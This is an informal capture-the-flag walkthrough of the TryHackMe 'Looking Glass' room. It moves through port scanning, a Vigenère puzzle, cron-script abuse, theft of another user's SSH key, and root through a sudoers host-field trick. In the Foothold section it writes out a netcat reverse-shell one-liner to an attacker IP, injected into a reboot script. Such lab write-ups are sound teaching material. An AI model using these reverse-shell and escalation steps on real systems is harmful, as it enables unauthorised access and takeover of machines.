# Looking Glass
[Play](https://tryhackme.com/room/lookingglass)

## Recon

nmap scan:

```
❯ nmap -script=default -sV -A -T4 10.10.216.198
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 23:58 EST
Nmap scan report for 10.10.216.198
Host is up (0.23s latency).
Not shown: 916 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
```

This goes on for a while ... wtf? 

The website does not show shit, so gobuster is useless. At first i thought this was some bug, but I took a look at the hint, and it made sense: `O(log n) A looking glass is a mirror.` It's binary search to find the correct port! Let's do `ssh root@IP -p 9000` and move accordingly. Ah for the lowest its showing 'Lower' and for the highest its showing 'Higher'. Now the mirror part makes sense.

Lesgoo manual bruteforce ... yaayyyyyyyy :D the best thing ever!

```
❯ ssh root@10.10.216.198 -p 9220
Lower
Connection to 10.10.216.198 closed.
❯ ssh root@10.10.216.198 -p 9290
Higher
Connection to 10.10.216.198 closed.
```

aiyoo wtf is this shit. No other port in between ;-; Finally I stumble upon the port. What a pain! Also that port isn't shown for some reason hmmmmm

So we get:

```
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

Apparently its using the vignere cipher. Don't ask me how I know this. I just know it, ok?

`bewareTheJabberwock` is the last line!

Once we do that, we get:
```
Enter Secret: <:D>
jabberwock:WaxworksPreciousUnfastenedSorry
```

## Foothold

Let's login using the ssh 22 port (default).

```
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
```

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

The `poem.txt` is the jabberwock poem we saw earlier. Now what?

```
jabberwock@looking-glass:/home$ ls
alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
```

Well ... this is going to be a pain :/

So one important thing to look at is `crontab`, when nothing else is leading anywhere. We get:

```
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

Now from `sudo -l` we saw we can reboot. Sweet! We can just put our things in `twasBrillig.sh` to get into tweedledum. What to put in? `bash`. That's what I did. And that NOT what you should do.

do this instead `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MY_IP 1234 >/tmp/f" > twasBrillig.sh`, which puts this line in the `twasBrilling.sh` file.

Now my dumbass just put in bash, without realising that the port (which we found initially) was resected at each reboot. great.

Don't screup here! I'm just hoping this works :/ Well. Fuck. 3rd time.

Now that works :DDD. We first get a proper shell using `python3 -c "import pty;pty.spawn('/bin/bash')"`

```
tweedledum@looking-glass:~$ sudo -l
sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash
```

Not as much powerful of a user I see.

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

This looks like a hash, so we can do a hash identification. However, I did not find anything special here. So, it may as well be a series of hashes?

Using [this tool](https://hashes.com/en/tools/hash_identifier), yes it is!


![](https://i.imgur.com/L7kQNZ2.png)

hell yeah! 

We do not find anything here, other than some more random `poetry.txt`. What's left is the user alice. So check out what we can view? Well nothing in the `~`, but what abuot `.ssh`? Maybe we can get a RSA key?!

```
humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
ls -la .ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 .ssh/id_rsa
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
.....
-----END RSA PRIVATE KEY-----
```

Nice. Very nice.

```
❯ ssh alice@10.10.216.198 -i id.id
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id.id' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id.id": bad permissions
alice@10.10.216.198's password: 

❯ chmod 600 id.id
❯ ssh alice@10.10.216.198 -i id.id
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ ls
kitten.txt
```

## Priv Esc
So since we are in, with a stable connection, lets run `linpeas.sh` :D

Transfer using: `❯ scp -i path/to/id path/to/linpeas.sh alice@BOX_ID:~`

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.21p2 
```

For setuid:
```
Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
```

That did not work ... but something else did:

```
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# 
```
